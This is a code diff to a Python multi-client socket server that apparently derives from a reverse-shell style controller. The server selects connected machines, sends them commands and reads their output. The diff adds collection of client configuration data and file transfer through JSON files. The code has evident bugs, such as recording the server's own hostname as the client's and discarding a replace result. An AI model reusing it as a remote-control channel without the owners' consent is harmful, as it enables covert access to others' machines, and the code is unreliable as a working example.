@@ -2,6 +2,7 @@ import socket
 import threading
 import time
 import sys
+from datetime import datetime
 from queue import Queue
 import struct
 import signal
@@ -10,19 +11,26 @@ import json
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
+text_file = 'fileProj.json'
+receive = 'client-info.json'
+structure_file = 'server-info.json'
+clients_list = 'clients.json'
 
 COMMANDS = {'help':['Shows this help'],
             'list':['Lists connected clients'],
+            'get':['Gets file from client. Usage: "address CIACS get"'],
             'select':['Selects a client by its index. Takes index as a parameter'],
             'quit':['Stops current connection with a client. To be used when client is selected'],
             'shutdown':['Shuts server down'],
            }
 
+CLIENT_COMMANDS = ["b'GET locations'", "b'POST request'", "b'POST location'"]
+
 
 class MultiServer(object):
 
     def __init__(self):
-        self.host = '192.168.1.49'
+        self.host = '192.168.10.2'
         self.port = 65100
         self.socket = None
         self.all_connections = []
@@ -52,7 +60,7 @@ class MultiServer(object):
 
     def socket_create(self):
         try:
-            self.socket = socket.socket()
+            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
             print("Socket created")
         except socket.error as msg:
             print("Socket creation error: " + str(msg))
@@ -64,7 +72,7 @@ class MultiServer(object):
         """ Bind socket to port and wait for connection from client """
         try:
             self.socket.bind((self.host, self.port))
-            self.socket.listen(5)
+            self.socket.listen(1)
         except socket.error as e:
             print("Socket binding error: " + str(e))
             time.sleep(5)
@@ -81,7 +89,7 @@ class MultiServer(object):
             try:
                 conn, address = self.socket.accept()
                 conn.setblocking(1)
-                client_hostname = conn.recv(1024).decode("utf-8")
+                client_hostname = socket.gethostname()
                 address = address + (client_hostname,)
             except Exception as e:
                 print('Error accepting connections: %s' % str(e))
@@ -89,7 +97,29 @@ class MultiServer(object):
                 continue
             self.all_connections.append(conn)
             self.all_addresses.append(address)
-            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
+            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]) +' '+ str(datetime.now()))
+            data = conn.recv(85000)
+            if not data:
+                break
+            elif str(data) in CLIENT_COMMANDS[0]:
+                self.send_file(conn)
+                continue
+            elif str(data) in CLIENT_COMMANDS[1]:
+                continue
+            elif str(data) in CLIENT_COMMANDS[2] or data.startswith(b'POST location'):
+                self.receive_file(conn, data)
+                continue
+            elif data:
+                clients_list1 = open(clients_list)
+                add_to_list = json.load(clients_list1)
+                add_to_list['ip'] = address[0]
+                with open(clients_list, "w") as clw:
+                    clw.write(str(json.dumps(add_to_list)))
+                    clw.close()
+                self.get_file(conn, data)
+                import jsonreader
+                jsonreader.read()
+                continue
         return
 
     def start_turtle(self):
@@ -148,7 +178,10 @@ class MultiServer(object):
         except IndexError:
             print('Not a valid selection')
             return None, None
-        print("You are now connected to " + str(self.all_addresses[target][2]))
+        if 'get' in cmd:
+            print("You have sent command to " + str(self.all_addresses[target][2]))
+        else:
+            print("You are now connected to " + str(self.all_addresses[target][2]))
         return target, conn
 
     def read_command_output(self, conn):
@@ -201,6 +234,59 @@ class MultiServer(object):
         del self.all_addresses[target]
         return
 
+    def get_file(self, conn, data):
+        with open(text_file, "wb") as fw:
+            print("Receiving data of client PC configuration")
+            while True:
+                print('receiving')
+                if data == b'BEGIN':
+                    continue
+                elif data == b'ENDED':
+                    print('Breaking from file write')
+                    break
+                else:
+                    print('Received.')
+                    fw.write(data)
+                    print('Wrote to file.')
+                    break
+            fw.close()
+            conn.close()
+            return
+
+    def send_file(self, conn):
+        with open(structure_file, 'rb+') as fa:
+            print("Sending structure file.")
+            while True:
+                data = fa.read(4096)
+                conn.send(data)
+                if not data:
+                    break
+            fa.close()
+            conn.close()
+            print("Sent file.")
+        return
+
+    def receive_file(self, conn, data):
+        with open(receive, "wb") as fw:
+            print("Receiving updated data")
+            while True:
+                print('receiving')
+                print(type(data))
+                if data == b'BEGIN':
+                    continue
+                elif data == b'ENDED':
+                    print('Breaking from file write')
+                    break
+                else:
+                    data.replace(b'POST location', b'')
+                    print('Received: ', data.decode('utf-8'))
+                    fw.write(data)
+                    print('Wrote to file', data.decode('utf-8'))
+                    break
+            fw.close()
+            conn.close()
+            print("Received..")
+            return
 
 def create_workers():
     """ Create worker threads (will die when main exits) """
